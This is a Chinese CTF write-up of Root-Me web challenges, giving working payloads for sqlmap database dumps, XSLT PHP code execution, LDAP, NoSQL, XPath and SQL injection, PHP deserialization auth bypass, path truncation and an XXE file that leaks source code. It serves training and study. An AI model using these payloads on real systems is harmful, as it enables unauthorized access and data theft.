<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap<span class="selector-class">.py</span> -u <span class="string">"http://challenge01.root-me.org/web-serveur/ch19/?action=recherche"</span> --data=<span class="string">"recherche=asdf"</span>  --tables -<span class="selector-tag">p</span> recherche</span><br></pre></td></tr></table></figure>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">"http://challenge01.root-me.org/web-serveur/ch19/?action=recherche"</span> <span class="attribute">--data</span>=<span class="string">"recherche=asdf"</span>  -D<span class="built_in"> users </span>-p recherche --dump-all</span><br></pre></td></tr></table></figure>
<h2 id="XSLT-Code-execution"><a href="#XSLT-Code-execution" class="headerlink" title="XSLT - Code execution"></a>XSLT - Code execution</h2><p>XSLT，可扩展样式表语言转换，可以对XML进行转换，存在xslt服务器端注入攻击，可以参考文章</p>
<blockquote>
<p><a href="https://www.cnblogs.com/r00tuser/p/7255939.html" target="_blank" rel="noopener">https://www.cnblogs.com/r00tuser/p/7255939.html</a></p>
</blockquote>
<p>我们可以考虑注入PHP代码</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">'utf-8'</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:stylesheet</span> <span class="attr">version</span>=<span class="string">"1.0"</span> <span class="attr">xmlns:xsl</span>=<span class="string">"http://www.w3.org/1999/XSL/Transform"</span> <span class="attr">xmlns:php</span>=<span class="string">"http://php.net/xsl"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:template</span> <span class="attr">match</span>=<span class="string">"/"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">"php:function('getcwd')"</span>/&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xsl:template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xsl:stylesheet</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>利用该php函数可以获取当前目录，本题目要求我们读取.passwd文件，所以我们第一要做的事情是列目录，尝试了scandir函数，发现会返回Array，尝试了去读取array内容但是失败了，经过一个朋友提醒，换了另一个函数opendir函数，这个本来之前也用过，只是没有成功，再次尝试一下</p>
<p><img src="rootme1/11.png" alt=""></p>
<p>可以列出目录</p>
<p><img src="rootme1/12.png" alt=""></p>
<p>我们再依次读子目录，在子目录下发现目标文件，直接读取目标文件即可</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">"php:function('file_get_contents','./.6ff3200bee785801f420fba826ffcdee/.passwd')"</span>/&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>
<!-- X5L7_R0ckS -->
<h2 id="LDAP-injection-authentication"><a href="#LDAP-injection-authentication" class="headerlink" title="LDAP injection - authentication"></a>LDAP injection - authentication</h2><p><strong>LDAP：</strong> 轻量级目录访问协议，是以树状的层次结构来存储数据，本质上其实是一种非关系型数据库，有以下特点</p>
<blockquote>
<ul>
<li>LDAP的结构用树来表示，而不是用表格。正因为这样，就不能用SQL语句了</li>
<li>LDAP可以很快地得到查询结果，不过在写方面，就慢得多</li>
<li>LDAP提供了静态数据的快速查询方式</li>
<li>Client/server模型，Server 用于存储数据，Client提供操作目录信息树的工具</li>
<li>这些工具可以将数据库的内容以文本格式（LDAP 数据交换格式，LDIF）呈现在您的面前</li>
<li>LDAP是一种开放Internet标准，LDAP协议是跨平台的Interent协议</li>
</ul>
</blockquote>
<p>要做这道题，我们需要了解一些简单的LDAP查询语句：</p>
<p><strong>AND查询</strong><br><figure class="highlight hy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="name"><span class="builtin-name">&amp;</span></span>(<span class="name">parameter1=value1</span>)(<span class="name">parameter2=value2</span>))</span><br></pre></td></tr></table></figure></p>
<p><strong>OR查询</strong><br><figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(|(<span class="name">parameter1=value1</span>)(<span class="name">parameter2=value2</span>))</span><br></pre></td></tr></table></figure></p>
<p>此外还有通配符<strong>*</strong>，可以匹配任何内容</p>
<p>还有在LDAP中，下面的两个单独符号作为两个特殊常量</p>
<blockquote>
<p>(&amp;) —&gt; TRUE<br>(|) —&gt; FALSE</p>
</blockquote>
<p>在LDAP注入时，可像SQL注入一样，构造闭合语句即可。</p>
<hr>
<p>回到本题</p>
<p>尝试输入<code>add))</code>，题目返回报错信息</p>
<p><img src="rootme1/6.png" alt=""></p>
<p>我们可以据此分析LDAP语句为:</p>
<figure class="highlight hy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="name"><span class="builtin-name">&amp;</span></span>(<span class="name">uid=username</span>)(<span class="name">userPassword=password</span>))</span><br></pre></td></tr></table></figure>
<p>所以输入我们提交的内容之后，语句就为</p>
<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">(&amp;(uid=ad)</span>))<span class="comment">(userPassword=fasd)</span>)</span><br></pre></td></tr></table></figure>
<p>由于括号未构成闭合，所以导致出错。</p>
<p>那么我们通过构造永真式即可绕过验证</p>
<p>如果提交<code>username=*)(|(uid=*&amp;password=aa)</code>，那么在服务器端就变成了</p>
<figure class="highlight hy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="name"><span class="builtin-name">&amp;</span></span>(<span class="name">uid=*</span>)(|(<span class="name">uid=*</span>)(<span class="name">userPassword=aa</span>)))</span><br></pre></td></tr></table></figure>
<p>此语句逻辑是 <code>uid=*</code> 与 <code>userPassword=aa</code> 执行或操作，显然结果是true，之后该结果再与<code>uid=*</code>执行与操作，结果也为true，于是就绕过了验证，成功得到flag！</p>
<p>还有一些也是可以的，具体逻辑请自行分析</p>
<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">username</span> = *</span><br><span class="line"><span class="attr">password</span> = *)(&amp;</span><br></pre></td></tr></table></figure>
<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">username:</span> *)(|(userPassword=</span><br><span class="line"><span class="symbol">password:</span> *)</span><br></pre></td></tr></table></figure>
<h2 id="NoSQL-injection-authentication"><a href="#NoSQL-injection-authentication" class="headerlink" title="NoSQL injection - authentication"></a>NoSQL injection - authentication</h2><p>一个新的知识点，关于MongoDB的注入，是一种非关系型数据库</p>
<blockquote>
<p>传统的SQLi手段是不可行的。因为MongoDB所要求的输入形式是json的格式，例如：find({‘key1’;’value1’})在实际的使用中(PHP环境下)，一般是这样使用$collection-&gt;find(array(‘key’=&gt; ‘value’));</p>
</blockquote>
<p><strong>条件操作符</strong></p>
<figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$gt : &gt;</span><br><span class="line">$lt : &lt;</span><br><span class="line">$gte: &gt;=</span><br><span class="line">$lte: &lt;=</span><br><span class="line">$ne : !=、&lt;&gt;</span><br><span class="line">$in : <span class="keyword">in</span></span><br><span class="line">$nin: not <span class="keyword">in</span></span><br><span class="line">$all: all </span><br><span class="line">$or:or</span><br><span class="line">$not: 反匹配(<span class="number">1.3</span>.<span class="number">3</span>及以上版本)</span><br><span class="line">模糊查询用正则式：db.customer.find(&#123;<span class="string">'name'</span>: &#123;<span class="string">'$regex'</span>:<span class="string">'.*s.*'</span>&#125; &#125;)</span><br><span class="line">/**</span><br><span class="line">* : 范围查询 &#123; <span class="string">"age"</span> : &#123; <span class="string">"$gte"</span> : <span class="number">2</span> , <span class="string">"$lte"</span> : <span class="number">21</span>&#125;&#125;</span><br><span class="line">* : $ne &#123; <span class="string">"age"</span> : &#123; <span class="string">"$ne"</span> : <span class="number">23</span>&#125;&#125;</span><br><span class="line">* : $lt &#123; <span class="string">"age"</span> : &#123; <span class="string">"$lt"</span> : <span class="number">23</span>&#125;&#125;</span><br><span class="line">*/</span><br></pre></td></tr></table></figure>
<p>既然它有如此的特征，那么 我们可以结合PHP的数组绕过来解决这一问题，本题就是这样的一个实例</p>
<p>题目要求我们输入用户名和密码，那么我们用数组尝试绕过一下</p>
<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="link">http://challenge01.root-me.org/web-serveur/ch38/?login</span>[<span class="string">$lt</span>]=test&amp;pass[$ne]=1</span><br></pre></td></tr></table></figure>
<p>返回结果</p>
<blockquote>
<p>You are connected as : admin</p>
</blockquote>
<p>当我们换一个时</p>
<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="link">http://challenge01.root-me.org/web-serveur/ch38/?login</span>[<span class="string">$lt</span>]=admin&amp;pass[$ne]=1</span><br></pre></td></tr></table></figure>
<p>则又会返回是以test登录，但是这两个都无法得到flag，说明这个题目应该还存在一个隐藏用户，我们要设法以这个用户登录进去才可获得flag，我们可以尝试一下正则</p>
<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="link">http://challenge01.root-me.org/web-serveur/ch38/?login</span>[<span class="string">$regex</span>]=^[^(a|t)]&amp;pass[$ne]=1</span><br></pre></td></tr></table></figure>
<p>这样就可以匹配到第三个账号了</p>
<p>还有一种方法</p>
<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="link">http://challenge01.root-me.org/web-serveur/ch38/?login</span>[<span class="string">$lt</span>]=test&amp;login[$gt]=admin&amp;pass[$ne]=1</span><br></pre></td></tr></table></figure>
<p>通过字符串比较来达到绕过的效果。</p>
<h2 id="Path-Truncation"><a href="#Path-Truncation" class="headerlink" title="Path Truncation"></a>Path Truncation</h2><p>网上查找了一下资料，发现一篇文章<a href="https://www.dailysecurity.fr/les-path-truncations/" target="_blank" rel="noopener">Click Here</a>，不知道是那种语言，反正用有道翻译勉强可以看懂，主要内容如下：</p>
<blockquote>
<p>在PHP5.3版本以下，PHP能够接受的字符串最大长度为 <code>2^12</code>，也就是4096，所以如果我们提交的路径长度超出4096之后，就会发生一些奇怪的事情，例如<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">include</span><span class="params">(<span class="string">"/etc/passwd/./././././././././././././[4096 plus tard]/."</span>)</span></span></span><br></pre></td></tr></table></figure></p>
<p>被翻译成<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">"/etc/passwd"</span>);</span><br></pre></td></tr></table></figure></p>
<p>于是成功的绕过了验证</p>
<p>此外，还需要注意路径的大小，它必须保持奇数，比如 <code>admin.php</code> 有9个字符，而 <code>admin.html</code> 则是有10个字符，这意味着你必须平衡道路上的字符数，否则就不会正确地使用，例如：<code>x/../admin.html</code> 可以成功，Windows下还可以用 <code>admin.php.............[4096]............</code> 来实现相同的效果</p>
<p>当然，我们必须记住，它只能在小于5.3的版本中使用。<br>为了弥补这一缺陷，只需将其PHP更新为5.3。</p>
</blockquote>
<hr>
<p>回到本题</p>
<p><img src="rootme1/9.png" alt="payload"></p>
<h2 id="PHP-Serialization"><a href="#PHP-Serialization" class="headerlink" title="PHP Serialization"></a>PHP Serialization</h2><p>网站可以查看源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">define(<span class="string">'INCLUDEOK'</span>, <span class="keyword">true</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'showsource'</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/******** AUTHENTICATION *******/</span></span><br><span class="line"><span class="comment">// login / passwords in a PHP array (sha256 for passwords) !</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'./passwd.inc.php'</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION[<span class="string">'login'</span>]) || !$_SESSION[<span class="string">'login'</span>]) &#123;</span><br><span class="line">    $_SESSION[<span class="string">'login'</span>] = <span class="string">""</span>;</span><br><span class="line">    <span class="comment">// form posted ?</span></span><br><span class="line">    <span class="keyword">if</span>($_POST[<span class="string">'login'</span>] &amp;&amp; $_POST[<span class="string">'password'</span>])&#123;</span><br><span class="line">        $data[<span class="string">'login'</span>] = $_POST[<span class="string">'login'</span>];</span><br><span class="line">        $data[<span class="string">'password'</span>] = hash(<span class="string">'sha256'</span>, $_POST[<span class="string">'password'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// autologin cookie ?</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>($_COOKIE[<span class="string">'autologin'</span>])&#123;</span><br><span class="line">        $data = unserialize($_COOKIE[<span class="string">'autologin'</span>]);</span><br><span class="line">        $autologin = <span class="string">"autologin"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// check password !</span></span><br><span class="line">    <span class="keyword">if</span> ($data[<span class="string">'password'</span>] == $auth[ $data[<span class="string">'login'</span>] ] ) &#123;</span><br><span class="line">        $_SESSION[<span class="string">'login'</span>] = $data[<span class="string">'login'</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// set cookie for autologin if requested</span></span><br><span class="line">        <span class="keyword">if</span>($_POST[<span class="string">'autologin'</span>] === <span class="string">"1"</span>)&#123;</span><br><span class="line">            setcookie(<span class="string">'autologin'</span>, serialize($data));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// error message</span></span><br><span class="line">        $message = <span class="string">"Error : $autologin authentication failed !"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*********************************/</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">...</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// message ?</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($message))</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;p&gt;&lt;em&gt;$message&lt;/em&gt;&lt;/p&gt;"</span>;</span><br><span class="line"><span class="comment">// admin ?</span></span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'login'</span>] === <span class="string">"superadmin"</span>)&#123;</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">'admin.inc.php'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// user ?</span></span><br><span class="line"><span class="keyword">elseif</span> (<span class="keyword">isset</span>($_SESSION[<span class="string">'login'</span>]) &amp;&amp; $_SESSION[<span class="string">'login'</span>] !== <span class="string">""</span>)&#123;</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">'user.inc.php'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>由这段代码可知</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'login'</span>] === <span class="string">"superadmin"</span>)&#123;</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">'admin.inc.php'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>必须以superadmin登录，才可以获得flag</p>
<p>关键逻辑如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION[<span class="string">'login'</span>]) || !$_SESSION[<span class="string">'login'</span>]) &#123;</span><br><span class="line">    $_SESSION[<span class="string">'login'</span>] = <span class="string">""</span>;</span><br><span class="line">    <span class="comment">// form posted ?</span></span><br><span class="line">    <span class="keyword">if</span>($_POST[<span class="string">'login'</span>] &amp;&amp; $_POST[<span class="string">'password'</span>])&#123;</span><br><span class="line">        $data[<span class="string">'login'</span>] = $_POST[<span class="string">'login'</span>];</span><br><span class="line">        $data[<span class="string">'password'</span>] = hash(<span class="string">'sha256'</span>, $_POST[<span class="string">'password'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// autologin cookie ?</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>($_COOKIE[<span class="string">'autologin'</span>])&#123;</span><br><span class="line">        $data = unserialize($_COOKIE[<span class="string">'autologin'</span>]);</span><br><span class="line">        $autologin = <span class="string">"autologin"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// check password !</span></span><br><span class="line">    <span class="keyword">if</span> ($data[<span class="string">'password'</span>] == $auth[ $data[<span class="string">'login'</span>] ] ) &#123;</span><br><span class="line">        $_SESSION[<span class="string">'login'</span>] = $data[<span class="string">'login'</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// set cookie for autologin if requested</span></span><br><span class="line">        <span class="keyword">if</span>($_POST[<span class="string">'autologin'</span>] === <span class="string">"1"</span>)&#123;</span><br><span class="line">            setcookie(<span class="string">'autologin'</span>, serialize($data));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// error message</span></span><br><span class="line">        $message = <span class="string">"Error : $autologin authentication failed !"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如果我们<strong><em>没有POST用户名和密码</em></strong>的话，题目就会通过反序列化获取cookie里面的用户信息，而在验证逻辑中使用了 <code>==</code> ，这就看到了漏洞点，因为在PHP中， 字符串与布尔真进行 <code>==</code> 是会判断为真的，例如 <code>&#39;afdsfaf&#39;==True</code> 是会判断成立的，所以在验证密码时，我们可以使我们的密码为布尔True，那么与密码字符串判断则会返回True，从而绕过验证。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$data[<span class="string">"login"</span>] = <span class="string">"superadmin"</span>;</span><br><span class="line">$data[<span class="string">"password"</span>] = <span class="keyword">True</span>;</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($data));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>然后抓包修改请求即可</p>
<p><img src="rootme1/7.png" alt="payload"></p>
<p>发送就可以收到结果啦</p>
<p><img src="rootme1/8.png" alt="result"></p>
<h2 id="SQL-injection-numeric"><a href="#SQL-injection-numeric" class="headerlink" title="SQL injection - numeric"></a>SQL injection - numeric</h2><p>数字型注入，打开页面后点击信息，注入点在news_id上，直接注入即可，不需要单引号闭合，用 <code>--+</code> 作为注释</p>
<figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-<span class="number">1</span> <span class="class"><span class="keyword">union</span> <span class="title">select</span> 1,<span class="title">name</span>,3 <span class="title">from</span> <span class="title">sqlite_master</span>--+</span></span><br></pre></td></tr></table></figure>
<p>具体步骤不再细说，用sqlmap更快</p>
<h2 id="SQL-Injection-Routed"><a href="#SQL-Injection-Routed" class="headerlink" title="SQL Injection - Routed"></a>SQL Injection - Routed</h2><p>这道题目知识点叫路由注入，我觉得也相当于二次注入，我们第一次提交的内容会被执行SQL查询操作，执行结果不回显而是被代入第二个SQL语句中，然后题目在最终回显第二次查询的内容。</p>
<p>题目有个介绍相关知识点的网址 <a href="http://securityidiots.com/Web-Pentest/SQL-Injection/routed_sql_injection.html" target="_blank" rel="noopener">Click Here!</a>，给出了实例代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line">$id=$_GET[<span class="string">'id'</span>];</span><br><span class="line">$query=<span class="string">"SELECT id,sec_code FROM users WHERE id='$id'"</span>;</span><br><span class="line"><span class="keyword">if</span> (!$result=mysql_query($query,$conn))  </span><br><span class="line">	<span class="keyword">die</span>(<span class="string">"Error While Selection process : "</span> . mysql_error());</span><br><span class="line"><span class="keyword">if</span>(mysql_num_rows($result) == <span class="number">0</span>)		</span><br><span class="line">	<span class="keyword">die</span>();</span><br><span class="line">$row = mysql_fetch_array($result, MYSQL_ASSOC);</span><br><span class="line">$query=<span class="string">"SELECT username FROM users WHERE sec_code='"</span>.$row[<span class="string">'sec_code'</span>].<span class="string">"'"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;font color=red&gt;This is the query which gives you Output : &lt;/font&gt;$query&lt;br&gt;&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span> (!$result=mysql_query($query,$conn))  </span><br><span class="line">	<span class="keyword">die</span>(<span class="string">"Error While Selection process : "</span> . mysql_error());</span><br><span class="line"><span class="keyword">if</span>(mysql_num_rows($result) == <span class="number">0</span>)		</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">"Invalid Input parameter"</span>);</span><br><span class="line">$row = mysql_fetch_array($result, MYSQL_ASSOC);		</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Username is : '</span> . $row[<span class="string">'username'</span>] . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>绕过的payload如下</p>
<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://leettime.net/sqlninja.com/tasks/routed_sqli_1.php?id=<span class="number">1</span>' <span class="keyword">and</span> <span class="literal">false</span> union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">0</span>x2720756e696f6e2073656c65637420312c3223<span class="comment">--+</span></span><br></pre></td></tr></table></figure>
<p>相当于第一次查询的第二个元素在第二次查询中执行并且回显</p>
<hr>
<p>回到本题</p>
<p>题目中逗号，括号等都被过滤了，当我们使用union查询时，由于无法使用逗号，故只能返回第一个内容，然后利用我们前面的知识点，题目应该是取第一次查询的结果到第二次中查询，那么我们可以考虑在第一次查询中注入SQL语句，由于双引号被过滤，可以使用十六进制编码，此处为直观起见，只给出SQL语句</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">login=' union <span class="keyword">select</span> <span class="string">"'order by 2-- -"</span>%<span class="number">23</span></span><br></pre></td></tr></table></figure>
<p><code>-- -</code> 是为了注释第二次查询的SQL语句<br>题目返回正常回显，经过测试发现列数为2，接下来测试</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">"'union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span> <span class="comment">-- -"</span></span><br></pre></td></tr></table></figure>
<p>返回1和2</p>
<p>题目到此基本上就出来了，剩下的就是常规注入了，大家自己动手即可。</p>
<h2 id="SQL-Truncation"><a href="#SQL-Truncation" class="headerlink" title="SQL Truncation"></a>SQL Truncation</h2><p>SQL截断攻击，这个很简单，就不多说了，直接注册一个<code>admin                                                             123</code>的用户，由于用户名长度超出了数据类型长度的限制而被截断，于是只剩下了<code>admin</code> 被存入数据库中，那么我们就可以用这个用户的密码以admin的身份登录了</p>
<h2 id="XML-External-Entity"><a href="#XML-External-Entity" class="headerlink" title="XML External Entity"></a>XML External Entity</h2><p>XXE（外部实体注入），题目可以远程引入rss文件，而rss文件是符合xml规范的，这题我们需要注意的是我们引入的xml文件必须要符合rss标准，否则会解析错误，在自己的vps上写入文件</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE root [&lt;!ENTITY  file1 SYSTEM "php://filter/read=convert.base64-encode/resource=index.php"&gt;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">rss</span> <span class="attr">xmlns:slash</span>=<span class="string">"http://purl.org/rss/1.0/modules/slash/"</span> <span class="attr">version</span>=<span class="string">"2.0"</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">channel</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">item</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">title</span>&gt;</span>&amp;file1;<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">item</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">channel</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">rss</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>然后在RSS Validity Checker页面提交 <code>http://your_vps_ip/exp.xml</code> ，然后就可以收到PHP文件内容了。</p>
<h2 id="XPath-injection-authentication"><a href="#XPath-injection-authentication" class="headerlink" title="XPath injection - authentication"></a>XPath injection - authentication</h2><p>Xpath注入，Xpath是用于在XML中选取相应数据的语言，XML相当于数据库的话，xpath相当于sql查询语言，可以查看这篇文章 <a href="https://blog.csdn.net/quiet_girl/article/details/50588130" target="_blank" rel="noopener">https://blog.csdn.net/quiet_girl/article/details/50588130</a>，当我使用了它提供的这种基本思路 <code>username=John&amp;password=&#39; or &#39;&#39;=&#39;&#39; or &#39;&#39;=&#39;</code> 可以登录，但是由于匹配到了所有的用户，但是题目值只回显第一个普通用户，这无法使我们以administrator身份登录，所以我们需要尝试其他的思路， 我们有members页面知道administrator权限的用户名为John，那么我们可以尝试将password验证闭合掉只验证用户名，那我们不就可以登录任意用户名了，我们构造一下即可</p>
